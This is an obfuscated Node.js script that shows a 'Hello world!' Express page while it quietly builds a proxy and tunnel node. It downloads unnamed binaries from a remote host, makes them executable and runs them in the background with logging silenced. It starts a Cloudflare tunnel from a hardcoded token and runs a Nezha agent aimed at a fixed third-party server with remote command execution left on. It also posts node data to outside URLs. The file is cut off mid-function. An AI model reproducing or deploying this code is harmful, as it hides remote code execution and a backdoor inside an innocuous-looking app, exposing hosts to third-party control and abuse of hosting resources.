const _0x4c27fa=_0x3bbd;(function(_0x53a9fd,_0xc2afab){const _0x52b361={_0x86a7ba:0x1ee,_0x1f02d1:0x143,_0x582888:0x142,_0x560ffa:0x166,_0x47ca28:0x16d,_0x2c377a:0x1af},_0x5621ff=_0x3bbd,_0x2639b3=_0x53a9fd();while(!![]){try{const _0x1c325e=-parseInt(_0x5621ff(_0x52b361._0x86a7ba))/0x1*(parseInt(_0x5621ff(_0x52b361._0x1f02d1))/0x2)+-parseInt(_0x5621ff(_0x52b361._0x582888))/0x3+parseInt(_0x5621ff(0x18a))/0x4*(parseInt(_0x5621ff(_0x52b361._0x560ffa))/0x5)+parseInt(_0x5621ff(0x1cc))/0x6*(-parseInt(_0x5621ff(0x139))/0x7)+-parseInt(_0x5621ff(0x159))/0x8*(parseInt(_0x5621ff(_0x52b361._0x47ca28))/0x9)+-parseInt(_0x5621ff(_0x52b361._0x2c377a))/0xa+-parseInt(_0x5621ff(0x1f8))/0xb*(-parseInt(_0x5621ff(0x1b3))/0xc);if(_0x1c325e===_0xc2afab)break;else _0x2639b3['push'](_0x2639b3['shift']());}catch(_0x509e36){_0x2639b3['push'](_0x2639b3['shift']());}}}(_0x5abd,0xc86de));const express=require(_0x4c27fa(0x1fc)),app=express(),axios=require(_0x4c27fa(0x16e)),os=require('os'),fs=require('fs'),path=require(_0x4c27fa(0x161)),{promisify}=require('util'),exec=promisify(require(_0x4c27fa(0x163))['exec']),{execSync}=require(_0x4c27fa(0x163)),UPLOAD_URL=process[_0x4c27fa(0x17c)][_0x4c27fa(0x137)]||'',PROJECT_URL=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1b7)]||'',AUTO_ACCESS=process[_0x4c27fa(0x17c)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1a8)]||_0x4c27fa(0x172),SUB_PATH=process[_0x4c27fa(0x17c)]['SUB_PATH']||_0x4c27fa(0x1f2),PORT=process[_0x4c27fa(0x17c)][_0x4c27fa(0x194)]||process[_0x4c27fa(0x17c)][_0x4c27fa(0x199)]||0xbb8,UUID=process['env'][_0x4c27fa(0x1fb)]||_0x4c27fa(0x1ef),NEZHA_SERVER=process[_0x4c27fa(0x17c)]['NEZHA_SERVER']||_0x4c27fa(0x19f),NEZHA_PORT=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1f3)]||'',NEZHA_KEY=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1be)]||'GTmVnjnxL0bC41DDvN7UzMNqf6jAK9TM',ARGO_DOMAIN=process[_0x4c27fa(0x17c)][_0x4c27fa(0x156)]||_0x4c27fa(0x1d0),ARGO_AUTH=process['env'][_0x4c27fa(0x14c)]||_0x4c27fa(0x152),ARGO_PORT=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1b1)]||0x1f41,CFIP=process['env'][_0x4c27fa(0x17a)]||_0x4c27fa(0x19c),CFPORT=process[_0x4c27fa(0x17c)][_0x4c27fa(0x1cd)]||0x1bb,NAME=process['env'][_0x4c27fa(0x178)]||'';!fs[_0x4c27fa(0x1dd)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4c27fa(0x1ca)](FILE_PATH+_0x4c27fa(0x1db))):console[_0x4c27fa(0x1ca)](FILE_PATH+_0x4c27fa(0x19b));function generateRandomName(){const _0xb601d9={_0x2095bf:0x1b9,_0x38895a:0x1de,_0x691f55:0x1a7},_0x327b64=_0x4c27fa,_0x3e669b=_0x327b64(0x180);let _0x54ef13='';for(let _0xab2328=0x0;_0xab2328<0x6;_0xab2328++){_0x54ef13+=_0x3e669b[_0x327b64(_0xb601d9._0x2095bf)](Math[_0x327b64(0x1f9)](Math[_0x327b64(_0xb601d9._0x38895a)]()*_0x3e669b[_0x327b64(_0xb601d9._0x691f55)]));}return _0x54ef13;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4c27fa(0x14e)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4c27fa(0x14e)](FILE_PATH,botName),subPath=path[_0x4c27fa(0x14e)](FILE_PATH,_0x4c27fa(0x1a3)),listPath=path[_0x4c27fa(0x14e)](FILE_PATH,_0x4c27fa(0x14d)),bootLogPath=path[_0x4c27fa(0x14e)](FILE_PATH,_0x4c27fa(0x1a0)),configPath=path[_0x4c27fa(0x14e)](FILE_PATH,_0x4c27fa(0x189));function deleteNodes(){const _0x8d1e87={_0x16b653:0x1d9,_0x4b3fa3:0x135,_0x3d3342:0x175,_0x7f7949:0x1ce},_0xa7bd40=_0x4c27fa;try{if(!UPLOAD_URL)return;if(!fs[_0xa7bd40(0x1dd)](subPath))return;let _0x30a98c;try{_0x30a98c=fs['readFileSync'](subPath,_0xa7bd40(0x183));}catch{return null;}const _0xc88bcc=Buffer[_0xa7bd40(0x1dc)](_0x30a98c,'base64')[_0xa7bd40(_0x8d1e87._0x16b653)](_0xa7bd40(0x183)),_0x46f7ac=_0xc88bcc['split']('\x0a')[_0xa7bd40(_0x8d1e87._0x4b3fa3)](_0x15f4ef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa7bd40(0x19a)](_0x15f4ef));if(_0x46f7ac[_0xa7bd40(0x1a7)]===0x0)return;return axios[_0xa7bd40(0x1d4)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x46f7ac}),{'headers':{'Content-Type':_0xa7bd40(_0x8d1e87._0x3d3342)}})[_0xa7bd40(_0x8d1e87._0x7f7949)](_0x3f1f36=>{return null;}),null;}catch(_0x3cd594){return null;}}function cleanupOldFiles(){const _0x57876b={_0x4b2425:0x14e};try{const _0x30197d=fs['readdirSync'](FILE_PATH);_0x30197d['forEach'](_0x253f88=>{const _0x1f531b=_0x3bbd,_0x4ded0c=path[_0x1f531b(_0x57876b._0x4b2425)](FILE_PATH,_0x253f88);try{const _0x12863b=fs[_0x1f531b(0x1e4)](_0x4ded0c);_0x12863b[_0x1f531b(0x19d)]()&&fs[_0x1f531b(0x1ed)](_0x4ded0c);}catch(_0x4cb875){}});}catch(_0x5613f6){}}app['get']('/',function(_0x5a035a,_0x258335){const _0x58e986={_0xa088ac:0x154},_0xe9310e=_0x4c27fa;_0x258335[_0xe9310e(_0x58e986._0xa088ac)]('Hello\x20world!');});async function generateConfig(){const _0x1e4cf7={_0x2aa2a9:0x17b,_0x27fc10:0x1d2,_0x1cd09f:0x177,_0x552b20:0x17b,_0x34caa6:0x136,_0x9992d4:0x1bd,_0x2f03c5:0x1ea,_0x286b35:0x168,_0xb104ca:0x165,_0x53345f:0x1b6,_0x58874b:0x1bd,_0x42408c:0x17b,_0x53e4e5:0x165,_0x4bcf43:0x15a,_0x2b7bdc:0x1f1,_0xdfbbc5:0x1c6,_0x91590c:0x164,_0x1b6a58:0x167},_0x13bbef=_0x4c27fa,_0x44b078={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x13bbef(_0x1e4cf7._0x2aa2a9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x13bbef(_0x1e4cf7._0x27fc10),'settings':{'clients':[{'id':UUID,'flow':_0x13bbef(_0x1e4cf7._0x1cd09f)}],'decryption':_0x13bbef(_0x1e4cf7._0x552b20),'fallbacks':[{'dest':0xbb9},{'path':_0x13bbef(0x1c0),'dest':0xbba},{'path':_0x13bbef(_0x1e4cf7._0x34caa6),'dest':0xbbb},{'path':_0x13bbef(0x158),'dest':0xbbc}]},'streamSettings':{'network':_0x13bbef(0x1ea)}},{'port':0xbb9,'listen':_0x13bbef(_0x1e4cf7._0x9992d4),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x13bbef(0x17b)},'streamSettings':{'network':_0x13bbef(_0x1e4cf7._0x2f03c5),'security':_0x13bbef(_0x1e4cf7._0x552b20)}},{'port':0xbba,'listen':_0x13bbef(_0x1e4cf7._0x9992d4),'protocol':_0x13bbef(0x1d2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x13bbef(_0x1e4cf7._0x552b20),'wsSettings':{'path':_0x13bbef(0x1c0)}},'sniffing':{'enabled':!![],'destOverride':[_0x13bbef(0x14f),'tls',_0x13bbef(0x1b6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x13bbef(_0x1e4cf7._0x9992d4),'protocol':_0x13bbef(_0x1e4cf7._0x286b35),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x13bbef(0x136)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x13bbef(_0x1e4cf7._0xb104ca),_0x13bbef(_0x1e4cf7._0x53345f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x13bbef(_0x1e4cf7._0x58874b),'protocol':_0x13bbef(0x1e7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x13bbef(_0x1e4cf7._0x42408c),'wsSettings':{'path':_0x13bbef(0x158)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x13bbef(_0x1e4cf7._0x53e4e5),_0x13bbef(_0x1e4cf7._0x53345f)],'metadataOnly':![]}}],'dns':{'servers':[_0x13bbef(_0x1e4cf7._0x4bcf43)]},'outbounds':[{'protocol':_0x13bbef(_0x1e4cf7._0x2b7bdc),'tag':_0x13bbef(_0x1e4cf7._0xdfbbc5)},{'protocol':_0x13bbef(_0x1e4cf7._0x91590c),'tag':'block'}]};fs[_0x13bbef(0x1b0)](path[_0x13bbef(0x14e)](FILE_PATH,_0x13bbef(0x189)),JSON[_0x13bbef(_0x1e4cf7._0x1b6a58)](_0x44b078,null,0x2));}function getSystemArchitecture(){const _0x1441b7={_0x2bcbb0:0x1e1},_0x309493=_0x4c27fa,_0x56ce66=os[_0x309493(0x1ac)]();return _0x56ce66===_0x309493(0x169)||_0x56ce66===_0x309493(0x150)||_0x56ce66===_0x309493(0x17e)?_0x309493(0x169):_0x309493(_0x1441b7._0x2bcbb0);}function _0x5abd(){const _0xa3313d=['trojan','stream','2083','tcp','https://oooo.serv00.net/add-url','php\x20running\x20error:\x20','unlinkSync','39687ltEUXR','5149febf-ff0c-4507-9fdf-c2bedf29add3','Subscription\x20uploaded\x20successfully','freedom','sub','NEZHA_PORT','org','\x0a\x20\x20tunnel:\x20','?encryption=none&security=tls&sni=','map','7775526gmRZeL','floor','\x0a\x20\x20credentials-file:\x20','UUID','express','TunnelSecret','base64','filter','/vmess-argo','UPLOAD_URL','2053','139587dFqHmW','&fp=firefox&type=ws&host=','https://ipapi.co/json/','taskkill\x20/f\x20/im\x20','tunnel.json','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/v1','\x0aclient_secret:\x20','then','2498865jvfqlA','24OfHApt','mkdirSync','nohup\x20','https://amd64.ssss.nyc.mn/agent','finish','\x0a\x0avmess://','pop','Unknown','match','ARGO_AUTH','list.txt','join','http','arm64','\x20-c\x20','eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiYmM0Y2NiNzAtM2Y5OS00Y2I1LWIxYTUtZjFlZjU4MDg3NWI3IiwicyI6IlpHRTRNekF3TURVdE0yRXlaaTAwWmpKaUxXSmpaalF0WmpFM056TmhPREk0TldSaCJ9','ArgoDomain:','send','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ARGO_DOMAIN','Download\x20','/trojan-argo','96qJDRur','https+local://8.8.8.8/dns-query','createWriteStream','\x20>\x20nul\x202>&1','basename','text/plain;\x20charset=utf-8','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20','path','http://ip-api.com/json/','child_process','blackhole','tls','995PGHUAO','stringify','vmess','arm','del\x20/f\x20/q\x20','\x20successfully','push','224667SjpLkU','axios','all','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','./tmp','\x20>/dev/null\x202>&1','--tls','application/json','\x20is\x20running','xtls-rprx-vision','NAME','get','CFIP','none','env','clear','aarch64','/sub.txt\x20saved\x20successfully','abcdefghijklmnopqrstuvwxyz','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','includes','utf-8','8443','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Empowerment\x20success\x20for\x20','web\x20running\x20error:\x20','config.json','9644ZpactM','443','forEach','true','chmod','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://arm64.ssss.nyc.mn/web','2096','https://amd64.ssss.nyc.mn/bot','\x0a\x0atrojan://','SERVER_PORT','Error\x20in\x20startserver:','/api/add-subscriptions','\x22\x20>\x20/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PORT','test','\x20already\x20exists','cdns.doon.eu.org','isFile','pkill\x20-f\x20\x22[','144.22.159.118:8008','boot.log','unshift','automatic\x20access\x20task\x20added\x20successfully','sub.txt','Unhandled\x20error\x20in\x20startserver:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','?security=tls&sni=','length','FILE_PATH','Skipping\x20adding\x20automatic\x20access\x20task','data','response','arch','has','substring','3281230ogPmxZ','writeFileSync','ARGO_PORT','rm\x20-rf\x20','60VSGgkH','https://amd64.ssss.nyc.mn/web','/api/add-nodes','quic','PROJECT_URL','App\x20is\x20running','charAt','countryCode','2087','firefox','127.0.0.1','NEZHA_KEY','readFileSync','/vless-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','success','Empowerment\x20failed\x20for\x20','npm\x20running\x20error:\x20','fileUrl','direct','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','set','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','log','Error\x20reading\x20boot.log:','378xWCrtg','CFPORT','catch','split','sapus.rtyuoi.ggff.net','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','vless','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','post','win32','/tunnel.yml\x20run','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','toString','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20is\x20created','from','existsSync','random','status','\x20-p\x20','amd','country_code','message','statSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20failed:\x20'];_0x5abd=function(){return _0xa3313d;};return _0x5abd();}function downloadFile(_0x5acc7d,_0x5d10c7,_0x5bf155){const _0x3373de={_0x260e36:0x144},_0x13ac2b={_0x28ee85:0x171},_0x5189a6={_0x252e68:0x171},_0x327af5={_0x229c7d:0x1e6},_0x4d927e=_0x4c27fa,_0x2e472b=_0x5acc7d;!fs[_0x4d927e(0x1dd)](FILE_PATH)&&fs[_0x4d927e(_0x3373de._0x260e36)](FILE_PATH,{'recursive':!![]});const _0x11b93a=fs[_0x4d927e(0x15b)](_0x2e472b);axios({'method':_0x4d927e(0x179),'url':_0x5d10c7,'responseType':_0x4d927e(0x1e8)})[_0x4d927e(0x141)](_0x34fe29=>{const _0x294bb5={_0x4d53d8:0x16b},_0xc6dfe0=_0x4d927e;_0x34fe29[_0xc6dfe0(0x1aa)]['pipe'](_0x11b93a),_0x11b93a['on'](_0xc6dfe0(0x147),()=>{const _0x4870d3=_0xc6dfe0;_0x11b93a['close'](),console[_0x4870d3(0x1ca)](_0x4870d3(0x157)+path[_0x4870d3(0x15d)](_0x2e472b)+_0x4870d3(_0x294bb5._0x4d53d8)),_0x5bf155(null,_0x2e472b);}),_0x11b93a['on'](_0xc6dfe0(_0x5189a6._0x252e68),_0x200306=>{const _0x3288a7=_0xc6dfe0;fs['unlink'](_0x2e472b,()=>{});const _0x29c4fd=_0x3288a7(0x157)+path[_0x3288a7(0x15d)](_0x2e472b)+_0x3288a7(_0x327af5._0x229c7d)+_0x200306[_0x3288a7(0x1e3)];console[_0x3288a7(0x171)](_0x29c4fd),_0x5bf155(_0x29c4fd);});})['catch'](_0x524058=>{const _0x462087=_0x4d927e,_0x4fc878=_0x462087(0x157)+path[_0x462087(0x15d)](_0x2e472b)+_0x462087(0x1e6)+_0x524058['message'];console[_0x462087(_0x13ac2b._0x28ee85)](_0x4fc878),_0x5bf155(_0x4fc878);});}async function downloadFilesAndRun(){const _0x595a04={_0x4a6e7f:0x1a7,_0x5ca534:0x15f,_0x4e1bf6:0x149,_0x1b0482:0x184,_0x1e16cf:0x1bb,_0x3191d4:0x1e9,_0xe46b02:0x18d,_0x5038e2:0x140,_0x575c20:0x198,_0x4197fd:0x145,_0x15cbcb:0x176,_0x41c148:0x171,_0x293e39:0x1ec,_0x5eb450:0x138,_0x4690ac:0x174,_0x41d48b:0x1c9,_0xfd53e1:0x1ca,_0x28c77f:0x145,_0x2f5584:0x1dd,_0x175c46:0x1da,_0x541901:0x1d1},_0x27d427={_0x5419c6:0x1c5},_0x390225=_0x4c27fa,_0x31bf1a=getSystemArchitecture(),_0x50743a=getFilesForArchitecture(_0x31bf1a);if(_0x50743a[_0x390225(_0x595a04._0x4a6e7f)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5872d2=_0x50743a[_0x390225(0x1f7)](_0x469021=>{return new Promise((_0x1f7650,_0x5ca311)=>{const _0xe951f3=_0x3bbd;downloadFile(_0x469021['fileName'],_0x469021[_0xe951f3(_0x27d427._0x5419c6)],(_0x31978c,_0x4f00f8)=>{_0x31978c?_0x5ca311(_0x31978c):_0x1f7650(_0x4f00f8);});});});try{await Promise[_0x390225(0x16f)](_0x5872d2);}catch(_0x3a32f6){console['error'](_0x390225(_0x595a04._0x5ca534),_0x3a32f6);return;}function _0x292a17(_0x54016a){const _0x55214c=_0x390225,_0x4125d0=0x1fd;_0x54016a[_0x55214c(0x18c)](_0x168ee2=>{const _0xd25587={_0x16a407:0x1ca},_0x192c2d=_0x55214c;fs['existsSync'](_0x168ee2)&&fs[_0x192c2d(0x18e)](_0x168ee2,_0x4125d0,_0x2c31bf=>{const _0x383e5d=_0x192c2d;_0x2c31bf?console[_0x383e5d(0x171)](_0x383e5d(0x1c3)+_0x168ee2+':\x20'+_0x2c31bf):console[_0x383e5d(_0xd25587._0x16a407)](_0x383e5d(0x187)+_0x168ee2+':\x20'+_0x4125d0[_0x383e5d(0x1d9)](0x8));});});}const _0x4b5a70=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x292a17(_0x4b5a70);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x405eac=NEZHA_SERVER[_0x390225(0x182)](':')?NEZHA_SERVER[_0x390225(0x1cf)](':')[_0x390225(_0x595a04._0x4e1bf6)]():'',_0x4f06cf=new Set([_0x390225(0x18b),_0x390225(_0x595a04._0x1b0482),_0x390225(0x191),_0x390225(_0x595a04._0x1e16cf),_0x390225(_0x595a04._0x3191d4),'2053']),_0xe60420=_0x4f06cf[_0x390225(0x1ad)](_0x405eac)?_0x390225(_0x595a04._0xe46b02):'false',_0x38659d=_0x390225(_0x595a04._0x5038e2)+NEZHA_KEY+_0x390225(_0x595a04._0x575c20)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xe60420+_0x390225(0x1a5)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x38659d);const _0x764a46=_0x390225(_0x595a04._0x4197fd)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x390225(0x1c7);try{await exec(_0x764a46),console[_0x390225(0x1ca)](phpName+_0x390225(_0x595a04._0x15cbcb)),await new Promise(_0x562c4a=>setTimeout(_0x562c4a,0x3e8));}catch(_0x3eb799){console[_0x390225(_0x595a04._0x41c148)](_0x390225(_0x595a04._0x293e39)+_0x3eb799);}}else{let _0x3c3910='';const _0x204727=[_0x390225(0x18b),_0x390225(_0x595a04._0x1b0482),_0x390225(0x191),_0x390225(_0x595a04._0x1e16cf),'2083',_0x390225(_0x595a04._0x5eb450)];_0x204727['includes'](NEZHA_PORT)&&(_0x3c3910=_0x390225(_0x595a04._0x4690ac));const _0x5d277e='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x390225(0x1e0)+NEZHA_KEY+'\x20'+_0x3c3910+_0x390225(_0x595a04._0x41d48b);try{await exec(_0x5d277e),console[_0x390225(_0x595a04._0xfd53e1)](npmName+_0x390225(0x176)),await new Promise(_0x15b20d=>setTimeout(_0x15b20d,0x3e8));}catch(_0x3507c5){console['error'](_0x390225(0x1c4)+_0x3507c5);}}}else console[_0x390225(0x1ca)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x54742a=_0x390225(_0x595a04._0x28c77f)+webPath+_0x390225(0x151)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x54742a),console[_0x390225(_0x595a04._0xfd53e1)](webName+_0x390225(0x176)),await new Promise(_0x3057f3=>setTimeout(_0x3057f3,0x3e8));}catch(_0x256113){console[_0x390225(_0x595a04._0x41c148)](_0x390225(0x188)+_0x256113);}if(fs[_0x390225(_0x595a04._0x2f5584)](botPath)){let _0xf8af38;if(ARGO_AUTH[_0x390225(0x14b)](/^[A-Z0-9a-z=]{120,250}$/))_0xf8af38=_0x390225(_0x595a04._0x175c46)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xf8af38=_0x390225(0x1e5)+FILE_PATH+_0x390225(0x1d6):_0xf8af38=_0x390225(_0x595a04._0x541901)+FILE_PATH+_0x390225(0x185)+ARGO_PORT;try{await exec(_0x390225(0x145)+botPath+'\x20'+_0xf8af38+_0x390225(0x1d7)),console[_0x390225(_0x595a04._0xfd53e1)](botName+_0x390225(0x176)),await new Promise(_0x21624d=>setTimeout(_0x21624d,0x7d0));}catch(_0x343408){console[_0x390225(0x171)]('Error\x20executing\x20command:\x20'+_0x343408);}}await new Promise(_0x28d0e6=>setTimeout(_0x28d0e6,0x1388));}function getFilesForArchitecture(_0x41354b){const _0x3995af={_0xd1bb69:0x190,_0xa6ef62:0x13e,_0x3d0249:0x169,_0x46418c:0x146,_0x29ce22:0x1a1,_0x4192ef:0x169,_0x31e0ba:0x13f},_0x1cbc69=_0x4c27fa;let _0x1f8019;_0x41354b==='arm'?_0x1f8019=[{'fileName':webPath,'fileUrl':_0x1cbc69(_0x3995af._0xd1bb69)},{'fileName':botPath,'fileUrl':_0x1cbc69(_0x3995af._0xa6ef62)}]:_0x1f8019=[{'fileName':webPath,'fileUrl':_0x1cbc69(0x1b4)},{'fileName':botPath,'fileUrl':_0x1cbc69(0x192)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x8e5418=_0x41354b===_0x1cbc69(_0x3995af._0x3d0249)?'https://arm64.ssss.nyc.mn/agent':_0x1cbc69(_0x3995af._0x46418c);_0x1f8019[_0x1cbc69(_0x3995af._0x29ce22)]({'fileName':npmPath,'fileUrl':_0x8e5418});}else{const _0x42b391=_0x41354b===_0x1cbc69(_0x3995af._0x4192ef)?'https://arm64.ssss.nyc.mn/v1':_0x1cbc69(_0x3995af._0x31e0ba);_0x1f8019[_0x1cbc69(_0x3995af._0x29ce22)]({'fileName':phpPath,'fileUrl':_0x42b391});}}return _0x1f8019;}function argoType(){const _0x19612f={_0x3899b3:0x1fd,_0x3f0c20:0x1fa,_0x1a1a51:0x14e,_0x59a6e5:0x1d3,_0xc31cd7:0x18f,_0x7950bd:0x14e,_0x59a6f5:0x1ca,_0x1a3a9a:0x181},_0x14e87b=_0x4c27fa;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x14e87b(0x155));return;}if(ARGO_AUTH['includes'](_0x14e87b(_0x19612f._0x3899b3))){fs[_0x14e87b(0x1b0)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4558b9=_0x14e87b(0x1f5)+ARGO_AUTH[_0x14e87b(0x1cf)]('\x22')[0xb]+_0x14e87b(_0x19612f._0x3f0c20)+path[_0x14e87b(_0x19612f._0x1a1a51)](FILE_PATH,_0x14e87b(0x13d))+_0x14e87b(_0x19612f._0x59a6e5)+ARGO_DOMAIN+_0x14e87b(_0x19612f._0xc31cd7)+ARGO_PORT+_0x14e87b(0x186);fs[_0x14e87b(0x1b0)](path[_0x14e87b(_0x19612f._0x7950bd)](FILE_PATH,'tunnel.yml'),_0x4558b9);}else console[_0x14e87b(_0x19612f._0x59a6f5)](_0x14e87b(_0x19612f._0x1a3a9a));}async function extractDomains(){const _0x20e238={_0xa6a3ce:0x1d8,_0x5dd364:0x1bf,_0x14f162:0x183,_0x3934c8:0x1cf,_0x3673df:0x18c,_0xe451e1:0x1c1,_0x35bc2a:0x1ed,_0x151fe1:0x14e},_0x48da65={_0x300c1a:0x13b,_0x5e0b6e:0x1e2,_0x391bcc:0x1f4,_0x14715c:0x162,_0x2f19fe:0x1aa,_0x4e7d1f:0x1c2,_0x2ab52c:0x1aa,_0x65ee48:0x1ba,_0x1f8cec:0x14a},_0x5f5196={_0x2f6560:0x13c,_0x355193:0x19e,_0xbd0d01:0x1ae},_0x116729={_0x24d6ce:0x14b,_0xb290b9:0x16c},_0x563545=_0x4c27fa;let _0x3d2a88;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3d2a88=ARGO_DOMAIN,console['log'](_0x563545(_0x20e238._0xa6a3ce),_0x3d2a88),await _0xebc343(_0x3d2a88);else try{const _0x26f11f=fs[_0x563545(_0x20e238._0x5dd364)](path['join'](FILE_PATH,_0x563545(0x1a0)),_0x563545(_0x20e238._0x14f162)),_0x14eb27=_0x26f11f[_0x563545(_0x20e238._0x3934c8)]('\x0a'),_0x540100=[];_0x14eb27[_0x563545(_0x20e238._0x3673df)](_0x121b51=>{const _0x5d8ed9=_0x563545,_0x8c2cd7=_0x121b51[_0x5d8ed9(_0x116729._0x24d6ce)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x8c2cd7){const _0x358f86=_0x8c2cd7[0x1];_0x540100[_0x5d8ed9(_0x116729._0xb290b9)](_0x358f86);}});if(_0x540100[_0x563545(0x1a7)]>0x0)_0x3d2a88=_0x540100[0x0],console[_0x563545(0x1ca)](_0x563545(0x153),_0x3d2a88),await _0xebc343(_0x3d2a88);else{console[_0x563545(0x1ca)](_0x563545(_0x20e238._0xe451e1)),fs[_0x563545(_0x20e238._0x35bc2a)](path[_0x563545(_0x20e238._0x151fe1)](FILE_PATH,'boot.log'));async function _0x3468b3(){const _0x1933f1=_0x563545;try{process['platform']==='win32'?await exec(_0x1933f1(_0x5f5196._0x2f6560)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x1933f1(_0x5f5196._0x355193)+botName['charAt'](0x0)+']'+botName[_0x1933f1(_0x5f5196._0xbd0d01)](0x1)+_0x1933f1(0x197));}catch(_0x42103a){}}_0x3468b3(),await new Promise(_0x5371b9=>setTimeout(_0x5371b9,0xbb8));const _0x198a5e=_0x563545(0x1d1)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x563545(0x145)+botPath+'\x20'+_0x198a5e+_0x563545(0x1d7)),console['log'](botName+_0x563545(0x176)),await new Promise(_0x3ef658=>setTimeout(_0x3ef658,0xbb8)),await extractDomains();}catch(_0x56321e){console[_0x563545(0x171)]('Error\x20executing\x20command:\x20'+_0x56321e);}}}catch(_0x209506){console[_0x563545(0x171)](_0x563545(0x1cb),_0x209506);}async function _0x274ac7(){const _0x505e84=_0x563545;try{const _0x59842d=await axios[_0x505e84(0x179)](_0x505e84(_0x48da65._0x300c1a),{'timeout':0xbb8});if(_0x59842d[_0x505e84(0x1aa)]&&_0x59842d[_0x505e84(0x1aa)][_0x505e84(_0x48da65._0x5e0b6e)]&&_0x59842d[_0x505e84(0x1aa)][_0x505e84(_0x48da65._0x391bcc)])return _0x59842d[_0x505e84(0x1aa)][_0x505e84(_0x48da65._0x5e0b6e)]+'_'+_0x59842d['data'][_0x505e84(_0x48da65._0x391bcc)];}catch(_0x4e195f){try{const _0x4b325f=await axios[_0x505e84(0x179)](_0x505e84(_0x48da65._0x14715c),{'timeout':0xbb8});if(_0x4b325f[_0x505e84(0x1aa)]&&_0x4b325f[_0x505e84(_0x48da65._0x2f19fe)]['status']===_0x505e84(_0x48da65._0x4e7d1f)&&_0x4b325f[_0x505e84(0x1aa)]['countryCode']&&_0x4b325f[_0x505e84(_0x48da65._0x2f19fe)][_0x505e84(_0x48da65._0x391bcc)])return _0x4b325f[_0x505e84(_0x48da65._0x2ab52c)][_0x505e84(_0x48da65._0x65ee48)]+'_'+_0x4b325f['data'][_0x505e84(0x1f4)];}catch(_0xffa1c0){}}return _0x505e84(_0x48da65._0x1f8cec);}async function _0xebc343(_0x37f750){const _0x47052e=await 